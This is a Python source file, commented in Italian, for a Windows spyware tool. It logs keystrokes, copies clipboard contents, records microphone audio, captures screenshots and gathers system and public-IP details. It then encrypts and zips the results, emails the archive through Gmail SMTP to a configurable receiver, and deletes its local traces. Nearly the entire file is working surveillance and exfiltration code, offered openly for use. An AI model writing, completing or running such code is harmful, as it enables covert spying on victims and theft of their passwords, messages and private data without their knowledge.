import os
import time
import socket
import platform
import win32clipboard
import sounddevice as sd
import zipfile
import smtplib
import shutil
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from email.message import EmailMessage
import socket
from requests import get
from PIL import ImageGrab
from scipy.io.wavfile import write
from cryptography.fernet import Fernet
from pynput.keyboard import Key, Listener
import threading
import requests

# Configurazione email
EMAIL_SENDER = "SENDER EMAIL"
EMAIL_PASSWORD = "APP PASSWORD"
EMAIL_RECEIVER = "RECEIVER EMAIL"

# Configurazione file
FILE_PATH = "/path/to/this/file (\\ as path divider)"
KEYS_INFO = "key_log.txt"
SYSTEM_INFO = "system_info.txt"
CLIPBOARD_INFO = "clipboard.txt"
AUDIO_INFO = "audio.wav"
SCREENSHOT_INFO = "screenshot.png"
ENCRYPTED_FILES_DIR = "encrypted_files\\"

# Configurazione della registrazione e iterazioni
audio_duration = 10  # secondi
time_iteration = 15  # secondi
number_of_iterations_end = 3  # numero cicli

# Variabili di controllo
number_of_iterations = 0


# Caricamento della chiave segreta da un file esterno
def load_key():
    with open("secret.key", "rb") as key_file:
        return key_file.read()


# Inizializza la chiave di crittografia
KEY = load_key()
fernet = Fernet(KEY)

# Creazione cartella per i file crittografati
if not os.path.exists(FILE_PATH + ENCRYPTED_FILES_DIR):
    os.makedirs(FILE_PATH + ENCRYPTED_FILES_DIR)


# Funzione per ottenere informazioni sul sistema
def get_system_info():
    with open(FILE_PATH + SYSTEM_INFO, "w") as f:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write(f"Public IP Address: {public_ip}\n")
        except Exception:
            f.write("Couldn't get Public IP Address\n")
        f.write(f"Processor: {platform.processor()}\n")
        f.write(f"System: {platform.system()} {platform.version()}\n")
        f.write(f"Machine: {platform.machine()}\n")
        f.write(f"Hostname: {hostname}\n")
        f.write(f"Private IP Address: {ip_address}\n")


# Funzione per ottenere il contenuto degli appunti
def get_clipboard():
    with open(FILE_PATH + CLIPBOARD_INFO, "w") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write(f"Clipboard Data:\n{pasted_data}\n")
        except:
            f.write("Clipboard could not be copied\n")


# Funzione per registrare audio
def record_audio(iteration):
    fs = 44100
    recording = sd.rec(int(audio_duration * fs), samplerate=fs, channels=2)
    sd.wait()
    write(FILE_PATH + f"{iteration}_" + AUDIO_INFO, fs, recording)


# Funzione per fare uno screenshot
def take_screenshot(iteration):
    im = ImageGrab.grab()
    im.save(FILE_PATH + f"{iteration}_" + SCREENSHOT_INFO)


# Funzione per il keylogger
def keylogger(stop_event):
    def write_file(keys):
        with open(FILE_PATH + KEYS_INFO, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k == "Key.space":
                    f.write(" ")
                elif "Key" not in k:
                    f.write(k)
            f.write("\n")

    def on_press(key):
        keys.append(key)
        if len(keys) >= 10:
            write_file(keys)
            keys.clear()

    def on_release(key):
        if stop_event.is_set():
            return False

    keys = []
    stop_event.clear()
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


# Funzione per crittografare i file
def encrypt_files():
    files_to_encrypt = [SYSTEM_INFO, CLIPBOARD_INFO, KEYS_INFO]
    for file in files_to_encrypt:
        with open(FILE_PATH + file, "rb") as f:
            data = f.read()
        encrypted_data = fernet.encrypt(data)
        encrypted_file_path = FILE_PATH + ENCRYPTED_FILES_DIR + "encrypted_" + file
        with open(encrypted_file_path, "wb") as f:
            f.write(encrypted_data)


# Funzione per il ciclo di acquisizione dati
def collect_data():
    global number_of_iterations
    stop_event = threading.Event()
    # Avvia il keylogger in un thread separato
    keylogger_thread = threading.Thread(target=keylogger, args=(stop_event,))
    keylogger_thread.start()
    while number_of_iterations < number_of_iterations_end:
        # Esegui operazioni
        get_system_info()
        get_clipboard()
        record_audio(number_of_iterations + 1)
        take_screenshot(number_of_iterations + 1)
        number_of_iterations += 1
    # Termina il keylogger al termine dell'esecuzione
    stop_event.set()
    keylogger_thread.join()


# Funzione per comprimere i file in un archivio ZIP
def zip_files(include_a_s=False):
    files_to_zip = [
        ENCRYPTED_FILES_DIR + "encrypted_" + SYSTEM_INFO,
        ENCRYPTED_FILES_DIR + "encrypted_" + CLIPBOARD_INFO,
        ENCRYPTED_FILES_DIR + "encrypted_" + KEYS_INFO,
    ]
    if include_a_s == True:
        for i in range(number_of_iterations_end):
            audio_file = f"{i+1}_{AUDIO_INFO}"
            screenshot_file = f"{i+1}_{SCREENSHOT_INFO}"
            files_to_zip.append(audio_file)
            files_to_zip.append(screenshot_file)
    zip_file_path = FILE_PATH + "logs.zip"
    with zipfile.ZipFile(zip_file_path, "w") as zipf:
        for file in files_to_zip:
            zipf.write(
                FILE_PATH + file, os.path.basename(file)
            )  # Aggiungi il file al zip
    return zip_file_path


# Funzione per inviare l'email con l'archivio ZIP
def send_email():
    try:
        # Comprimiamo i file crittografati
        zip_file_path = zip_files(include_a_s=True)

        # Crea il messaggio email
        msg = MIMEMultipart()
        msg["From"] = EMAIL_SENDER
        msg["To"] = EMAIL_RECEIVER
        msg["Subject"] = "Important Information"

        # Corpo del messaggio (opzionale)
        body_content = "Allegato con informazioni raccolte."
        msg.attach(MIMEText(body_content, "plain"))

        # Aggiungi il file zip come allegato
        with open(zip_file_path, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())  # Aggiungi il contenuto del file
            encoders.encode_base64(part)  # Codifica l'allegato in base64
            part.add_header(
                "Content-Disposition",
                f"attachment; filename={os.path.basename(zip_file_path)}",
            )
            msg.attach(part)

        # Configura il server SMTP per inviare l'email
        server = smtplib.SMTP("smtp.gmail.com", 587)  # Usa il server di Gmail
        server.starttls()  # Abilita la crittografia TLS
        server.login(
            EMAIL_SENDER, EMAIL_PASSWORD
        )  # Login con il tuo indirizzo email e password
        server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())  # Invia l'email
        server.quit()  # Chiudi la connessione con il server SMTP
        print("Email inviata con successo!")
    except Exception as e:
        print(f"Errore durante l'invio dell'email: {e}")


# Avvia il programma
collect_data()

# Invia mail con file txt crittografati + screenshot e audio
encrypt_files()
send_email()

# Rimozione file creati
os.remove(FILE_PATH + "logs.zip")
for file in [KEYS_INFO, SYSTEM_INFO, CLIPBOARD_INFO]:
    os.remove(FILE_PATH + file)
for i in range(number_of_iterations_end):
    os.remove(FILE_PATH + f"{i+1}_" + AUDIO_INFO)
    os.remove(FILE_PATH + f"{i+1}_" + SCREENSHOT_INFO)
shutil.rmtree(ENCRYPTED_FILES_DIR)
